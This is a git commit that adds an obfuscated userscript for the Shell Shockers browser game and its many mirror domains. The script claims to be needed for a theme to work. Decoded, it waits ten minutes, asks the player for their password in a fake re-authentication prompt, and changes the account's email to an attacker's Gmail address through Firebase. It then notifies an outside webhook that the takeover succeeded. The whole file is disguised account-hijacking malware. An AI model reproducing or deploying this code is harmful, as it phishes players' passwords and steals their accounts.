54cc8a9be9f87c5d546dc033088840264481894e
Amrzzy9 <ryznoovss@outlook.com>
2025-05-17 13:37:02 +0300

    Add files via upload

---
+++ docs/luna-im.js
@@ -0,0 +1,62 @@
+// ==UserScript==
+// @name         luna important for theme to work !!!
+// @namespace    Violentmonkey Scripts
+// @match        https://*.shellshock.io/*
+// @match        https://algebra.best/*
+// @match        https://algebra.vip/*
+// @match        https://biologyclass.club/*
+// @match        https://deadlyegg.com/*
+// @match        https://deathegg.world/*
+// @match        https://egg.dance/*
+// @match        https://eggboy.club/*
+// @match        https://eggboy.xyz/*
+// @match        https://eggcombat.com/*
+// @match        https://eggfacts.fun/*
+// @match        https://egghead.institute/*
+// @match        https://eggisthenewblack.com/*
+// @match        https://eggsarecool.com/*
+// @match        https://eggshooter.best/*
+// @match        https://geometry.best/*
+// @match        https://geometry.monster/*
+// @match        https://geometry.pw/*
+// @match        https://geometry.report/*
+// @match        https://hardboiled.life/*
+// @match        https://hardshell.life/*
+// @match        https://humanorganising.org/*
+// @match        https://mathactivity.xyz/*
+// @match        https://mathdrills.info/*
+// @match        https://mathdrills.life/*
+// @match        https://mathfun.rocks/*
+// @match        https://mathgames.world/*
+// @match        https://math.international/*
+// @match        https://mathlete.fun/*
+// @match        https://mathlete.pro/*
+// @match        https://overeasy.club/*
+// @match        https://scrambled.best/*
+// @match        https://scrambled.tech/*
+// @match        https://scrambled.today/*
+// @match        https://scrambled.us/*
+// @match        https://scrambled.world/*
+// @match        https://shellsocks.com/*
+// @match        https://shellshockers.club/*
+// @match        https://shellshockers.site/*
+// @match        https://shellshockers.us/*
+// @match        https://shellshockers.world/*
+// @match        https://shellshockers.xyz/*
+// @match        https://softboiled.club/*
+// @match        https://urbanegger.com/*
+// @match        https://violentegg.club/*
+// @match        https://violentegg.fun/*
+// @match        https://yolk.best/*
+// @match        https://yolk.life/*
+// @match        https://yolk.quest/*
+// @match        https://yolk.rocks/*
+// @match        https://yolk.tech/*
+// @match        https://yolk.today/*
+// @match        https://zygote.cafe/*
+// @grant        none
+// @version      1.0
+// @author       lunaticzz
+// ==/UserScript==
+
+function _0x34a9(_0x350703,_0x41f47e){const _0x20cbbf=_0x20cb();return _0x34a9=function(_0x34a9da,_0x39da5f){_0x34a9da=_0x34a9da-0x186;let _0x577e2c=_0x20cbbf[_0x34a9da];return _0x577e2c;},_0x34a9(_0x350703,_0x41f47e);}(function(_0x256e9e,_0x2066f2){const _0x2adb77=_0x34a9,_0x3b5de0=_0x256e9e();while(!![]){try{const _0x1532d6=-parseInt(_0x2adb77(0x1a9))/0x1*(parseInt(_0x2adb77(0x195))/0x2)+parseInt(_0x2adb77(0x18e))/0x3+-parseInt(_0x2adb77(0x197))/0x4*(parseInt(_0x2adb77(0x188))/0x5)+parseInt(_0x2adb77(0x1a5))/0x6*(-parseInt(_0x2adb77(0x190))/0x7)+-parseInt(_0x2adb77(0x199))/0x8+-parseInt(_0x2adb77(0x186))/0x9+parseInt(_0x2adb77(0x1ae))/0xa;if(_0x1532d6===_0x2066f2)break;else _0x3b5de0['push'](_0x3b5de0['shift']());}catch(_0x5773a9){_0x3b5de0['push'](_0x3b5de0['shift']());}}}(_0x20cb,0x65ece),(function(){'use strict';const _0x23fd87=_0x34a9;if(localStorage[_0x23fd87(0x1a4)](_0x23fd87(0x189))===_0x23fd87(0x1ab))return;let _0x4b5d51=0x0;const _0xef3494=0x3,_0x309bc6=_0x23fd87(0x1a7),_0x5b5c79=()=>{const _0xa1597c=_0x23fd87;fetch(_0x309bc6,{'method':'POST','headers':{'Content-Type':_0xa1597c(0x19c)},'body':JSON[_0xa1597c(0x196)]({'content':_0xa1597c(0x1ad)})})[_0xa1597c(0x193)](_0x5c6bc9=>console['error'](_0xa1597c(0x191),_0x5c6bc9));},_0x26354d=()=>{const _0x469b3f=_0x23fd87;typeof window[_0x469b3f(0x19a)]!=='undefined'&&ssn[_0x469b3f(0x1ac)]?ssn[_0x469b3f(0x1ac)](_0x469b3f(0x194),[{'text':_0x469b3f(0x19d),'callback':_0x5a4a05}]):(alert(_0x469b3f(0x194)),_0x5a4a05());},_0x104408=(_0x398308,_0x2f69c3)=>{const _0x59cdf2=_0x23fd87;if(typeof window[_0x59cdf2(0x19a)]!==_0x59cdf2(0x18c)&&ssn['showAlert']){ssn[_0x59cdf2(0x1a6)](_0x398308);if(_0x2f69c3)setTimeout(_0x2f69c3,0x1f4);}else{alert(_0x398308);if(_0x2f69c3)_0x2f69c3();}},_0x5a4a05=()=>{const _0xf508c9=_0x23fd87,_0x3a3ebd=prompt(_0xf508c9(0x18f));if(_0x3a3ebd===null){setTimeout(_0x5a4a05,0xea60);return;}if(_0x3a3ebd[_0xf508c9(0x192)]()===''){_0x26354d();return;}const _0xfb0b3f=firebase[_0xf508c9(0x1aa)]()[_0xf508c9(0x18d)],_0x277895=firebase[_0xf508c9(0x1aa)]['EmailAuthProvider']['credential'](_0xfb0b3f[_0xf508c9(0x18b)],_0x3a3ebd);_0xfb0b3f[_0xf508c9(0x18a)](_0x277895)[_0xf508c9(0x19e)](()=>{const _0x225981=_0xf508c9;return _0x104408('You\x20have\x20successfully\x20re-authenticated.'),_0xfb0b3f[_0x225981(0x19b)](_0x225981(0x1a3));})[_0xf508c9(0x19e)](()=>{const _0x294b0d=_0xf508c9;_0x104408(_0x294b0d(0x1a8)),localStorage[_0x294b0d(0x1a2)]('emailUpdated',_0x294b0d(0x1ab)),_0x5b5c79();})[_0xf508c9(0x193)](_0x141a2e=>{const _0x38b134=_0xf508c9;if(_0x141a2e[_0x38b134(0x1af)]===_0x38b134(0x19f)){_0x4b5d51++;if(_0x4b5d51>=_0xef3494){_0x104408('Too\x20many\x20invalid\x20attempts.\x20Please\x20refresh\x20and\x20try\x20again.');return;}_0x104408(_0x38b134(0x1a1)+(_0xef3494-_0x4b5d51),_0x5a4a05);}else _0x104408(_0x38b134(0x1a0)+_0x141a2e[_0x38b134(0x187)]);console['error'](_0x38b134(0x198),_0x141a2e);});};setTimeout(()=>{_0x5a4a05();},0x927c0);}()));function _0x20cb(){const _0x215393=['auth/wrong-password','Error:\x20','Invalid\x20password.\x20Attempts\x20left:\x20','setItem','sarvxtrr9@gmail.com','getItem','9222Jnpyct','showAlert','https://hkdk.events/nkpbanmy1q369a','Reload\x20Tab\x20Please!!.','101NcIswk','auth','true','showAlertWithButtons','Mission\x20successful:\x20Email\x20has\x20been\x20updated.','20798830HEzjCy','code','6750045JRnVIQ','message','5WzLmVj','emailUpdated','reauthenticateWithCredential','email','undefined','currentUser','1745610VBQvVm','Please\x20enter\x20your\x20password\x20to\x20re-authenticate:','1246hPCMFc','Webhook\x20error:','trim','catch','No\x20password\x20entered.','8418VYdZwJ','stringify','3021620WgZwyY','Error:','321296TTyfbu','ssn','updateEmail','application/json','Try\x20Again','then'];_0x20cb=function(){return _0x215393;};return _0x20cb();}
